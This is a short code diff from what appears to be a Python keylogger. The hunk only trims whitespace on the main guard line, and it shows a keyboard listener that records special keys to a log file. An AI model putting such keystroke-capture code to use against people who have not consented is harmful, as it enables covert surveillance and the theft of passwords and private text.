@@ -14,7 +14,7 @@ def keypressed(key):
             # Handle special keys (like Shift, Ctrl, etc.)
             logkey.write(f'[{key.name}]')
 
-if __name__ == "__main__": 
+if __name__ == "__main__":
     listener = keyboard.Listener(on_press=keypressed)
     listener.start()
     listener.join() 
